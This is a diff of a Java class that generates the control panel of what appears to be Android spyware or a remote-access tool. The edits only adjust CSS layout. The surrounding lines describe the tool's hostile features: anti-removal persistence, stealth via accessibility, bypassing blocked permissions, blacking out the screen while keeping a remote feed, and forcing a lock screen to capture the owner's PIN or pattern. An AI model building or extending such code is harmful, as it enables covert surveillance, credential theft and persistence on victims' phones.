@@ -431,9 +431,9 @@ public class GhostModule extends BaseModule {
         html.append("<div class=\"ghost-utilities-grid\">");
         
         // 1. Maintenance Sequences (2x2 Grid: Repair, Optimize, Inject Trust, Heal)
-        html.append("<div class=\"info-item\" style=\"background: rgba(0, 242, 255, 0.03);\">");
+        html.append("<div class=\"info-item\" style=\"background: rgba(0, 242, 255, 0.03); align-items: stretch !important;\">");
         html.append("<div class=\"info-label\" style=\"color: var(--neon-cyan); font-size: 0.8rem;\">MAINTENANCE_SEQUENCES <span class=\"info-trigger\" onclick=\"showInfo(event, 'MAINTENANCE_SEQUENCES', 'Execute system maintenance, telemetry re-synchronization, power optimization, and environment repair protocols.')\">INFO</span></div>");
-        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px;\">");
+        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; width: 100% !important;\">");
         html.append("<button onclick=\"repairProtocol()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); width: 100% !important; margin: 0; font-size: 0.55rem;\">INITIATE_REPAIR</button>");
         html.append("<button onclick=\"optimizeStability()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); width: 100% !important; margin: 0; font-size: 0.55rem;\">OPTIMIZE_LINK</button>");
         html.append("<button onclick=\"injectTrust()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); width: 100% !important; margin: 0; font-size: 0.55rem;\">INJECT_TRUST</button>");
@@ -441,9 +441,9 @@ public class GhostModule extends BaseModule {
         html.append("</div></div>");
 
         // 2. Deep Repair Sequences
-        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
+        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03); align-items: stretch !important;\">");
         html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.8rem;\">DEEP_REPAIR_SEQUENCES <span class=\"info-trigger\" onclick=\"showInfo(event, 'DEEP_REPAIR', 'Direct system shortcuts to manually grant blocked permissions or handle OS security layers.')\">INFO</span></div>");
-        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px;\">");
+        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; width: 100% !important;\">");
         html.append("<button onclick=\"deepRepair()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width: 100% !important; margin: 0; font-size: 0.55rem;\">APP_INFO</button>");
         html.append("<button onclick=\"openAccessibility()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); width: 100% !important; margin: 0; font-size: 0.55rem;\">GHOST_MODE</button>");
         html.append("<button onclick=\"openNotifications()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); width: 100% !important; margin: 0; font-size: 0.55rem;\">INTEL_SYNC</button>");
@@ -451,9 +451,9 @@ public class GhostModule extends BaseModule {
         html.append("</div></div>");
 
         // 3. Automation/Persistence
-        html.append("<div class=\"info-item\" style=\"background: rgba(255,255,0,0.03);\">");
+        html.append("<div class=\"info-item\" style=\"background: rgba(255,255,0,0.03); align-items: stretch !important;\">");
         html.append("<div class=\"info-label\" style=\"color: var(--neon-yellow); font-size: 0.8rem;\">AUTOMATION/PERSISTENCE <span class=\"info-trigger\" onclick=\"showInfo(event, 'AUTOMATION_&_PERSISTENCE', 'Configure automated recovery protocols and anti-removal persistence layers.')\">INFO</span></div>");
-        html.append("<div style=\"display:flex; flex-direction:column; gap:8px; margin-top: 15px;\">");
+        html.append("<div style=\"display:flex; flex-direction:column; gap:8px; margin-top: 15px; width: 100% !important;\">");
         String autoPilotLabel = IO_Persistence_Manager.isAutoPilotEngaged() ? "AUTOPILOT_ENGAGED" : "AUTOPILOT_OFF";
         String autoPilotClass = IO_Persistence_Manager.isAutoPilotEngaged() ? "btn btn-small btn-engaged-yellow" : "btn btn-small";
         html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); width: 100% !important; margin: 0;\">").append(autoPilotLabel).append("</button>");
@@ -461,15 +461,15 @@ public class GhostModule extends BaseModule {
         html.append("</div></div>");
 
         // 4. Blackout Mode
-        html.append("<div class=\"info-item\" style=\"background: rgba(0,242,255,0.03);\">");
+        html.append("<div class=\"info-item\" style=\"background: rgba(0,242,255,0.03); align-items: stretch !important;\">");
         html.append("<div class=\"info-label\" style=\"font-size: 0.8rem;\">BLACKOUT_MODE <span class=\"info-trigger\" onclick=\"showInfo(event, 'BLACKOUT_MODE', 'Suppress hardware backlight for physical stealth while maintaining the remote feed.')\">INFO</span></div>");
         html.append("<button id=\"blackout-btn\" onclick=\"toggleBlackout()\" class=\"btn btn-small\" style=\"width:100% !important; margin:15px 0 0 0;\">ACTIVATE</button>");
         html.append("</div>");
 
         // 5. System Denial Lock & OS Keyguard Lock
-        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
+        html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03); align-items: stretch !important;\">");
         html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.8rem;\">SYSTEM_LOCKS <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_LOCKS', 'Trigger instant standard OS Keyguard phone lock to capture PIN/Pattern entries, or deploy our persistent full-screen security denial overlay.')\">INFO</span></div>");
-        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px;\">");
+        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; width: 100% !important;\">");
         html.append("<button id=\"os-lock-btn\" onclick=\"triggerOsLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width: 100% !important; margin: 0; font-size: 0.55rem;\" title=\"Trigger Standard OS Keyguard Lock\">OS_LOCK</button>");
         html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width: 100% !important; margin: 0; font-size: 0.55rem;\" title=\"Toggle Full Screen Security Denial Overlay\">LOCKOUT</button>");
         html.append("</div></div>");
